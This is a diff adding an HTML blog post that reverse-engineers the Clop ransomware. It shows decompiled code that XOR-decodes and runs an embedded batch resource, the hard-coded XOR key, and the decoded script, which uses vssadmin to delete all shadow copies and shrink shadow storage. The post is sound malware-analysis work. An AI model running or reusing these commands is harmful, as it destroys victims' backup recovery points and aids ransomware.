@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <meta name="generator" content="Hugo 0.54.0" />
+  <link rel="canonical" href="https://laserkittens.com/ransomware-sucks/">
+
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#000000">
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" type="text/css" href="https://laserkittens.com/css/paper.css">
+
+  
+  
+  <link rel="stylesheet" type="text/css" href="https://laserkittens.com/css/custom.css">
+
+  
+  
+  <title>Deobfuscating Clop ransomware resources | Laser Kittens</title>
+</head>
+  <body>
+    <div class="container paper">
+      <nav class="border split-nav">
+  <div class="nav-brand">
+    <h3><a href="/">Laser Kittens</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+    <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+      
+        <li><a href="/">Blog</a></li>
+      
+        <li><a href="/tags/">Tags</a></li>
+      
+        <li><a href="/about/">About</a></li>
+      
+        <li><a href="/index.xml">RSS</a></li>
+      
+      </ul>
+    </div>
+  </div>
+</nav>
+      <main>
+        
+
+<h1 class="post-title">Deobfuscating Clop ransomware resources</h1>
+
+
+<strong>Publish date: </strong>Mar 31, 2019
+<br>
+
+  <strong>Tags: </strong>
+  
+    <a href="https://laserkittens.com/tags/ransomware">ransomware</a>
+  
+    <a href="https://laserkittens.com/tags/clop">clop</a>
+  
+    <a href="https://laserkittens.com/tags/reverse-engineering">reverse-engineering</a>
+  
+
+
+
+  
+
+
+
+<p><a href="https://github.com/digitalcroqueta">A colleague</a> and I reverse-engineered the Clop ransomware binary, and observed that it contained two obfuscated resources:</p>
+
+<ul>
+<li>SIXSIX</li>
+<li>SIXSIX1</li>
+</ul>
+
+<p>One of them is just the README file that the malware drops all over the disk, so nothing too exciting, but the other is a batch script that deletes the volume shadow copies. Granted, you could just debug it and get it to drop these files, but as a personal challenge I decided to write a deobfuscator based on my analysis of the decompiled code (I looked at it in both Ghidra and IDA Pro, the latter of which was much more helpful in this case). After spending a bit of time labeling each variable/function, this is the relevant decompiled section of code:</p>
+
+<pre><code>HINSTANCE LoadExecuteClearSystemsBatchFile()
+{
+  HMODULE hModule; // eax
+  HMODULE phModule; // ebx
+  HRSRC hRsrcSIXSIX1; // eax
+  HRSRC phRsrcSIXSIX1; // esi
+  HGLOBAL hGlobalRsrcSIXSIX1; // eax
+  const void *ResourceLock; // edi
+  DWORD cbResourceSIXSIX1; // esi
+  HGLOBAL hDecryptedResourceMemory; // ebx
+  DWORD pcbResourceSIXSIX1; // edi
+  DWORD i; // esi
+  HANDLE hDecryptedFile; // esi
+  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-214h]
+  DWORD nNumberOfBytesToWrite; // [esp+10h] [ebp-210h]
+  CHAR currentPath; // [esp+14h] [ebp-20Ch]
+  CHAR FileName; // [esp+118h] [ebp-108h]
+
+  hModule = GetModuleHandleW(0);
+  phModule = hModule;
+  hRsrcSIXSIX1 = FindResourceW(hModule, (LPCWSTR)0xF447, L&quot;SIXSIX1&quot;);
+  phRsrcSIXSIX1 = hRsrcSIXSIX1;
+  hGlobalRsrcSIXSIX1 = LoadResource(phModule, hRsrcSIXSIX1);
+  ResourceLock = LockResource(hGlobalRsrcSIXSIX1);
+  cbResourceSIXSIX1 = SizeofResource(phModule, phRsrcSIXSIX1);
+  nNumberOfBytesToWrite = cbResourceSIXSIX1;
+  hDecryptedResourceMemory = GlobalAlloc(GMEM_ZEROINIT, cbResourceSIXSIX1);
+  memmove(hDecryptedResourceMemory, ResourceLock, cbResourceSIXSIX1);
+  pcbResourceSIXSIX1 = cbResourceSIXSIX1;
+  for ( i = 0; i &lt; pcbResourceSIXSIX1; ++i )
+    *((_BYTE *)hDecryptedResourceMemory + i) ^= charArrMagicStr[i % 0x42];
+  GetCurrentDirectoryA(260u, &amp;currentPath);
+  wsprintfA(&amp;FileName, &quot;%s\\clearsystems-10-1.bat&quot;, &amp;currentPath);
+  NumberOfBytesWritten = 0;
+  hDecryptedFile = CreateFileA(&amp;FileName, 0x40000000u, 2u, 0, 4u, 0x80u, 0);
+  if ( hDecryptedFile != (HANDLE)-1 )
+  {
+    WriteFile(hDecryptedFile, hDecryptedResourceMemory, pcbResourceSIXSIX1, &amp;NumberOfBytesWritten, 0);
+    CloseHandle(hDecryptedFile);
+  }
+  GlobalFree(hDecryptedResourceMemory);
+  return ShellExecuteA(0, &quot;open&quot;, &amp;FileName, 0, 0, 0);
+}
+</code></pre>
+
+<p>Beginning with this decompiled code, I quickly whipped up <a href="https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp">a deobfuscator in C++</a>, basically mimicking the decompiled code (with a couple minor shortcuts), which <a href="https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.cpp">I&rsquo;ve made available on GitHub.</a> Shortly thereafter, I decided to write <a href="https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py">a Python 3 version</a> that is much shorter (and cross-platform compatible), which is <a href="https://github.com/danzek/ransomware-sucks/blob/master/clop/decoder/decodeResource.py">now also on my GitHub.</a></p>
+
+<p>The ransomware has a harcoded &ldquo;magic&rdquo; string that it uses to deobfuscate the resources:</p>
+
+<pre><code>CHAR clopDecodeResourceSIXSIX1_MagicString[] = &quot;Clopfdwsjkjr23LKhuifdhwui73826ygGKUJFHGdwsieflkdsj324765tZPKQWLjwNVBFHewiuhryui32JKG&quot;;
+</code></pre>
+
+<p>From there it iterates over each byte in the file and XORs it by itself and the modulus (remainder) of the current byte offset and <code>0x42</code> (decimal value <code>66</code>) as an offset/subscript into the magic string:</p>
+
+<pre><code>*((BYTE *)hResourceMemory + i) ^= clopDecodeResourceSIXSIX1_MagicString[i % 66];
+</code></pre>
+
+<p>And here&rsquo;s our prize:</p>
+
+<pre><code>@echo off
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+</code></pre>
+
+<p>That&rsquo;s really all there is to it. The rest of the code is mostly just memory management and writing the deobfuscated data to a file.</p>
+
+
+<hr />
+
+<sub><em>The opinions expressed on this blog are solely those of the author(s) &mdash; no one else's (e.g., not my employers'). Feel free to click on any links, but just know that I do not endorse, control, or promote third-party websites and I make no representations about their content. All data and information provided on this site is for informational purposes only. I make no representations as to accuracy, completeness, currentness, suitability, or validity of any information on this site and I will not be liable for any errors, omissions, or delays in this information or any losses, injuries, or damages arising from its display or use. All information is provided on an as-is basis.</em></sub>
+  
+
+      </main>
+      
+  
+
+  </div>
+  </body>
+</html>
